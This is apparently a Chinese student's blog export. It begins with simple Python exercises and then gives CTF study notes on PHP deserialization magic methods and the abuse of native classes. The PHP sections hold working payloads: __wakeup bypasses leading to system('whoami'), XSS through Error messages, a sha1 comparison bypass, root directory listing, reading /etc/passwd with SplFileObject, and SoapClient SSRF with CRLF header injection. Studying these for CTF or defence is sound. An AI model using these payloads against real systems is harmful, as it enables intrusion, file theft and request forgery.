<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#1-剪刀；2-石头；3-布</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">count_pc=<span class="number">0</span></span><br><span class="line">count_per=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count_per&lt;<span class="number">3</span> <span class="keyword">and</span> count_pc&lt;<span class="number">3</span>:</span><br><span class="line">    pc=random.randint(<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line">    per=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入选择：1-剪刀；2-石头；3-布&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> per==<span class="number">1</span> <span class="keyword">and</span> pc==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;平&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">1</span> <span class="keyword">and</span> pc==<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you lose&quot;</span>)</span><br><span class="line">        count_pc=count_pc+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">1</span> <span class="keyword">and</span> pc==<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you win&quot;</span>)</span><br><span class="line">        count_per=count_per+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">2</span> <span class="keyword">and</span> pc==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you win&quot;</span>)</span><br><span class="line">        count_per=count_per+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">2</span> <span class="keyword">and</span> pc==<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;平局&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">2</span> <span class="keyword">and</span> pc==<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you lose&quot;</span>)</span><br><span class="line">        count_pc=count_pc+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">3</span> <span class="keyword">and</span> pc==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you lose&quot;</span>)</span><br><span class="line">        count_pc=count_pc+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">3</span> <span class="keyword">and</span> pc==<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you win&quot;</span>)</span><br><span class="line">        count_per=count_per+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">3</span> <span class="keyword">and</span> pc==<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;平局&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> count_pc==<span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;总比分为&#123;&#125;:&#123;&#125;,你输了&quot;</span>.<span class="built_in">format</span>(count_pc,count_per))</span><br><span class="line"><span class="keyword">elif</span> count_per==<span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;总比分为&#123;&#125;:&#123;&#125;,你赢了了&quot;</span>.<span class="built_in">format</span>(count_pc,count_per))</span><br></pre></td></tr></table></figure>

<p>想不出来有啥其他算法简化了，就用最傻逼的elif好了</p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2:"></a>level2:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211021359596.png" alt="2"></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码:"></a>代码:</h4><p>mod:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">beautiful</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; is beautiful&quot;</span>.<span class="built_in">format</span>(x))</span><br></pre></td></tr></table></figure>

<p>main:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from mod import beautiful</span><br><span class="line">beautiful(&quot;python&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="level3"><a href="#level3" class="headerlink" title="level3:"></a>level3:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211021400840.png" alt="3"></p>
<p>代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests,re</span><br><span class="line"></span><br><span class="line">def del_join(del_content,list_content):</span><br><span class="line">    for i in list_content:</span><br><span class="line">        list=re.split(del_content,i)</span><br><span class="line">        str=&quot;&quot;</span><br><span class="line">        print(&quot;&#123;&#125;\t&quot;.format(str.join(list)),end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">url=&quot;https://www.tianqi.com/chongqing/7/&quot;</span><br><span class="line">headers=&#123;</span><br><span class="line">&quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52&quot;</span><br><span class="line">&#125;</span><br><span class="line">html=requests.get(url,headers=headers).text</span><br><span class="line"></span><br><span class="line">temp_ch=re.compile(r&#x27;&lt;div class=&quot;weaul_z&quot;&gt;&lt;span&gt;(.*?)&lt;/div&gt;&#x27;)</span><br><span class="line">date_ch=re.compile(r&#x27;&lt;span class=&quot;fl&quot;&gt;(.*?)&lt;/span&gt;&#x27;)</span><br><span class="line">week_ch=re.compile(r&#x27;&lt;span class=&quot;fr&quot;&gt;(.*?)&lt;/span&gt;&#x27;)</span><br><span class="line"></span><br><span class="line">temp=temp_ch.findall(html)</span><br><span class="line">date=date_ch.findall(html)</span><br><span class="line">week=week_ch.findall(html)</span><br><span class="line"></span><br><span class="line">for i in date:</span><br><span class="line">    print(&quot;&#123;&#125;\t&quot;.format(i),end=&quot;&quot;)</span><br><span class="line">print(&quot;\n&quot;)</span><br><span class="line">for i in week:</span><br><span class="line">    print(&quot;&#123;&#125;\t&quot;.format(i),end=&quot;&quot;)</span><br><span class="line">print(&quot;\n&quot;)</span><br><span class="line">del_join(&quot;&lt;span&gt;|&lt;/span&gt;&quot;,temp)</span><br></pre></td></tr></table></figure>

<p>用requests和re模块，本来想用beautifulsoup，但爬出来会有乱码，放弃了</p>
<p>re具体的筛选就用温度、日期前边的div类型，然后出来的是个list</p>
<p>只有温度中间有其他的字符，就定义一个”del_join”函数，把温度中间的span和&#x2F;span删掉再拼接起来就好了</p>
<h3 id="level4"><a href="#level4" class="headerlink" title="level4:"></a>level4:</h3><p>搭建novelai，显卡1066，搭了也没啥用，懒得搭了</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>php魔术方法</title>
    <url>/2024/01/07/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="关于php的反序列化"><a href="#关于php的反序列化" class="headerlink" title="关于php的反序列化"></a>关于php的反序列化</h2><p>题里主要就是各种利用魔术方法进行跳转，从而实现恶意代码。</p>
<p>要利用这些魔术方法，就不得不了解一下有什么和如何利用</p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>构造函数，只有在new一个对象的时候会触发，这时候会执行__construct()下的语句</p>
<p>需要注意的是，在序列化和反序列化中都不会触发该方法</p>
<h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>析构函数会在对象被销毁的时候被调用，典型的就是die和unset函数，寒假考核的时候就用到了这个点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class web</span><br><span class="line">&#123;</span><br><span class="line">    public function __wakeup() </span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;不许反序列化哦&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class pwn</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;r1 . &#x27;  --0xfa&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当整个过程被die销毁之后，自然会触发pwn的__destruct函数，前提是序列化的时候包含了pwn</p>
<p>同时，反序列化结束回收的时候也会调用</p>
<h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p>当调用一个<strong>不存在的方法</strong>时会触发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public function __call($name,$arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $name.&#x27;--&#x27;.$arguments[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$a -&gt; fun(&#x27;test&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>调用了一个不存在的方法fun()，向fun()中传入了参数test，所以会把这个不存在的函数名存入__call里的$name变量，参数test存入$arguments中。这个$arguments是数组变量。</p>
<p>得到结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304081527924.png" alt="image-20230408152719876"></p>
<h3 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h3><p>当调用一个<strong>不存在的变量</strong>时会触发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$a -&gt; test;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>同样的，当调用这个不存在的变量test时，会自动执行__get命令，并把变量名传入$name中</p>
<h3 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h3><p>给不存在的变量<strong>赋值</strong>的时候会自动触发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public function __get($nam)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;get:&#x27;.$name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($name,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;set:&#x27;.$name.$value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$a -&gt; test = &#x27;test&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这时候就只会调用__set方法，而__get方法不调用了</p>
<h3 id="isset"><a href="#isset" class="headerlink" title="__isset"></a>__isset</h3><p>对不可访问的属性调用isset()或者empty()的时候触发</p>
<p>不可访问的属性包括：私有属性，不存在的属性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    protected $pro;</span><br><span class="line">    private $pri;</span><br><span class="line">    public function __isset($name)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data=unserialize($_POST[&#x27;data&#x27;]);</span><br><span class="line">isset($data-&gt;pro);</span><br><span class="line">empty($data-&gt;pri);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在hackbar中传入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=O:1:&quot;A&quot;:2:&#123;s:6:&quot;%00*%00pro&quot;;N;s:6:&quot;%00A%00pri&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>则会echo出pro和pri</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304081607014.png" alt="image-20230408160715995"></p>
<h3 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h3><p>同理，当用unset销毁不可访问的成员属性的时候就会触发该变量</p>
<h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h3><p>在把对象serialize()的时候触发</p>
<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>在进行反序列化的时候，会先检查是否存在__wakeup方法，如果存在则调用，再进行反序列化</p>
<p>一般来说，在做题的时候，wakeup一般都是入点，即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unserialize()-&gt;A::__wakeup()</span><br></pre></td></tr></table></figure>

<p>此外，还需要学会绕过wakeup</p>
<h4 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h4><p>最常见的一个绕过方法，即修改对象个数值</p>
<p>正常的值如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>如果A中存在wakeup要绕过，仅需把”A”:1改为”A”:2即可绕过</p>
<h4 id="C绕过"><a href="#C绕过" class="headerlink" title="C绕过"></a>C绕过</h4><p>把反序列化后的开头O换成C也可绕过wakeup，不过这样只能执行construct()函数或者destruct()函数，无法添加任何内容</p>
<p>但在ctfshow愚人杯还有种新方法可以绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">    	echo &#x27;pass&#x27;;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = $_GET[&#x27;1+1&gt;2&#x27;];</span><br><span class="line"></span><br><span class="line">if(!preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $data))&#123;</span><br><span class="line">    unserialize($data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfshow&#123;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">    	echo &#x27;pass&#x27;;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">$a=new ctfshow();</span><br><span class="line">echo serialize($a);</span><br><span class="line">#O:7:&quot;ctfshow&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>当把O改C传C:7:”ctfshow”:0:{}进去可显示pass，但是也就只能这么传入了，改了东西就没反应</p>
<p>可以用ArrayObject对正常的反序列化内容包装一次，让最后输出的payload以C开头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshow &#123;</span><br><span class="line">    public $ctfshow;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;OK&quot;;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=new ctfshow;</span><br><span class="line">$a-&gt;ctfshow=&quot;whoami&quot;;</span><br><span class="line">$arr=array(&quot;evil&quot;=&gt;$a);</span><br><span class="line">$oa=new ArrayObject($arr);</span><br><span class="line">$res=serialize($oa);</span><br><span class="line">echo $res;</span><br><span class="line">//unserialize($res)</span><br><span class="line">?&gt;</span><br><span class="line">#C:11:&quot;ArrayObject&quot;:77:&#123;x:i:0;a:1:&#123;s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这就成功执行了</p>
<p>以上内容照抄狗学长博客：<a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">PHP反序列化中wakeup()绕过总结 – fushulingのblog</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304161443929.jpg" alt="img"></p>
<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h3><p>当这个对象被当做字符串处理的时候，就会触发</p>
<p>常见的当做字符串处理有：</p>
<p>echo()输出，.拼接，preg_match()比较，substr()截取，strcmp()比较，file_exists()判断等</p>
<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h3><p>当对象被当成函数调用时触发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;invoke&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;a)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$b = new A();</span><br><span class="line">$a -&gt; a = $b;</span><br><span class="line">$a -&gt; invoke();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>此时，A类中的$a是一个A类，而在involve()函数中把$a当函数执行，即把A类当成一个函数调用，自然就进入了__invoke()中</p>
<h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><p>当clone一个类时调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class w_wuw_w</span><br><span class="line">&#123;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this -&gt; aaa = clone new EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class EeE</span><br><span class="line">&#123;</span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        $a = new cycycycy;</span><br><span class="line">        $a -&gt; aaa();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当进入w_wuw_w类中的__invoke()时，会clone一个EeE，此时则会进入EeE中的__clone()</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP原生类</title>
    <url>/2024/01/07/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于原生类的接触主要是在ctfshow菜鸟杯上的一道题，师傅用原生类两步就秒了，我还在来回折腾。所以记录一下在网上看到的可利用的原生类。</p>
<p>原生类，顾名思义就是自带的类，不需要事前进行class定义。</p>
<p>在ISCC2022web题有个就是典型的原生类利用</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304172321849.png" alt="image-20230417232054784"></p>
<p>其中new的类和向类中传递的参数都可以自定义，就随便用原生类</p>
<h1 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h1><h2 id="Error-x2F-Exception"><a href="#Error-x2F-Exception" class="headerlink" title="Error&#x2F;Exception"></a>Error&#x2F;Exception</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>这两个类中都内置了__toString()方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error(&quot;test&quot;);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>当执行时，会输出该“test”</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304172331089.png" alt="image-20230417233124069"></p>
<p>而这个test是直接拼接到网页中的，那就有xss攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>此时，会把<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>直接拼接到html中，造成xss攻击</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304172333969.png" alt="image-20230417233325942"></p>
<p>确实是当成脚本解析了</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304172334701.png" alt="image-20230417233451683"></p>
<h3 id="绕过哈希比较"><a href="#绕过哈希比较" class="headerlink" title="绕过哈希比较"></a>绕过哈希比较</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error(&quot;payload&quot;,1);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>在使用类中的__toString()方法时，向Error中传入的1并不会显示，这说明在字符串操作时候，只要传入的“payload”相同，即视为该<strong>字符串</strong>相同。</p>
<p>但不同的两个类本质上是不一样的。这样说可能有点绕，来看代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);</span><br><span class="line">echo $a . $b;</span><br></pre></td></tr></table></figure>

<p>注意，把$a和$b放在同一行定义才能保证echo出来的内容一致。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: payload in /home/kali/index.php:2 Stack trace: #0 &#123;main&#125;Error: payload in /home/kali/index.php:2 Stack trace: #0 &#123;main&#125;</span><br></pre></td></tr></table></figure>

<p>可见，两者的字符串是完全一致的，但是进行var_dump比对时，两者的值却不相同。</p>
<p>这就让我想起来之前学长布置过的一个rce：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if((string)$_POST[&#x27;a&#x27;] != (string)$_POST[&#x27;b&#x27;] &amp;&amp; sha1($_POST[&#x27;a&#x27;]) === sha1($_POST[&#x27;b&#x27;]))</span><br></pre></td></tr></table></figure>

<p>很不巧，这里是用post方法接收值，而且进行了string转换，而转换之后的值就一样了，所以没法用这个方法解，学长给出来的wp是用读取恶意构造的pdf文件以绕过。</p>
<p>但是如果换个题，把应用场景换在类中比较：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($this-&gt;a != $this-&gt;b &amp;&amp; sha1($this-&gt;a) === sha1($this-&gt;b))</span><br></pre></td></tr></table></figure>

<p>此时就可以用原生类绕过了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$this-&gt;a = new Error(&quot;payload&quot;,1);$this-&gt;b = new Error(&quot;payload&quot;,2);</span><br></pre></td></tr></table></figure>

<h2 id="Directorylterator-x2F-Filesystemlterator"><a href="#Directorylterator-x2F-Filesystemlterator" class="headerlink" title="Directorylterator&#x2F;Filesystemlterator"></a>Directorylterator&#x2F;Filesystemlterator</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir = $_GET[&#x27;whoami&#x27;];</span><br><span class="line">$a = new DirectoryIterator($dir);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>传入<code>/?whoami=glob:///*</code>即可查看根目录下的所有文件</p>
<p>如果不用foreach就只能查看第一个</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304181239835.png" alt="image-20230418123910771"></p>
<p>Filesystemlterator和DirectoryIterator的不同是：Filesystemlterator返回的是以绝对路径显示，而DirectoryIterator仅显示当前目录下</p>
<h2 id="Globlterator"><a href="#Globlterator" class="headerlink" title="Globlterator"></a>Globlterator</h2><p>这个类与前两个类似，不过这个查找文件时不需要搭配<code>glob://</code>伪协议使用，直接传入路径即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir = &quot;/*&quot;;</span><br><span class="line">$a = new GlobIterator($dir);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304181240938.png" alt="image-20230418124020916"></p>
<h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p>可以利用该类读取文件的一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$context = new SplFileObject(&#x27;/etc/passwd&#x27;);</span><br><span class="line">echo $context;</span><br></pre></td></tr></table></figure>

<p>但是也只能读一行，如果要全部读取要加foreach遍历</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$context = new SplFileObject(&#x27;/etc/passwd&#x27;);</span><br><span class="line">foreach($context as $f)&#123;</span><br><span class="line">    echo($f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>SoapClient类中内置了一个__call方法，触发该方法之后可以发送http和https请求。这个也可以被运用在ssrf中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public SoapClient :: SoapClient(mixed $wsdl [,array $options ])</span><br></pre></td></tr></table></figure>

<p>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</p>
<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
<p>则可以构造：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27;=&gt;&#x27;http://192.168.255.129:1234/aaa&#x27;, &#x27;uri&#x27;=&gt;&#x27;http://192.168.255.129:1234&#x27;));</span><br><span class="line">$a-&gt;a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在192.168.255.129上给一个1234的监听，可以接收到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /aaa HTTP/1.1</span><br><span class="line">Host: 192.168.255.129:1234</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: PHP-SOAP/8.2.0</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;http://192.168.255.129:1234#a&quot;</span><br><span class="line">Content-Length: 388</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;http://192.168.255.129:1234&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>如果HTTP头存在CRLF漏洞，就可以通过SSRF+CRLF插入任意HTTP头。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &#x27;http://192.168.255.129:1234&#x27;;</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;WHOAMI\r\nCookie: PHPSESSID=test&quot;, &#x27;uri&#x27; =&gt; &#x27;test&#x27;));</span><br><span class="line">$a-&gt;a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>成功插入cookie：</p>
